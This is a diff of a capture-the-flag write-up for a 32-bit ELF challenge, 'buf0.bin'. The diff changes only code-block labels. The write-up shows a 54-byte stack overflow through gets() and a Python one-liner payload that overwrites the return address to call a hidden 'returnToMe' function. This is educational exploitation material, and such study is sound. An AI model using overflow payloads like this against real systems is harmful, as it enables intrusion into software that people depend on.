@@ -6,14 +6,14 @@ tags: buffer overflow, writeups, reversing
 
 The binary can be obtained from here: [buf0](/static/files/buf0.bin). Let's see what `file` command has to tell us about this challenge file:
 
-```bash
+```console
 $ file buf0.bin
 buf0.bin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3a0cbf6e6af7d4a5d1294f2ce18e80ad3e778d48, not stripped
 ```
 
 So, this is an x86 ELF binary with symbols included. Let's run `strings` as well over this file:
 
-```bash
+```console
 $ strings buf0.bin
 /lib/ld-linux.so.2
 j,O)
@@ -41,7 +41,7 @@ Apart from the standard libc defintions and `main`, I see an interesting functio
 
 Like I mentioned earlier, this is where the `W00T!` string is printed and as per the assumption, we need to leverage the overflow in a way that this function is called. Let's now run the binary and see how it behaves:
 
-```bash
+```console
 $ ./buf0.bin
 AAAAAAAAAAA
 $
@@ -61,7 +61,7 @@ Segmentation fault (core dumped)
 
 So, the binary accepts input through the `gets` syscall and is as such vulnerable to a classic stack-based buffer overflow. We do some trial-and-error to figure out the size of the buffer and it turns out to be 54B after which any extra byte would corrupt the stack metadata resulting in a `Segmentation fault (core dumped)` error. So, these 54B comprise of the following stack variables:
 
-```bash
+```console
 50B (buf) + 4B (saved EBP)
 ```
 
@@ -76,7 +76,7 @@ But to keep things simple, let's just focus on how to complete the challenge by 
 
 From the IDA screenshot above it is already known that the `returnToMe` function is at location 0x08048404. Let's exploit the binary with a random payload of 54B concatenated with this new return address:
 
-```bash
+```console
 $ python -c 'print "A"*54 + "\x04\x84\x04\x08"' | ./buf0.bin
 W00T!
 ```
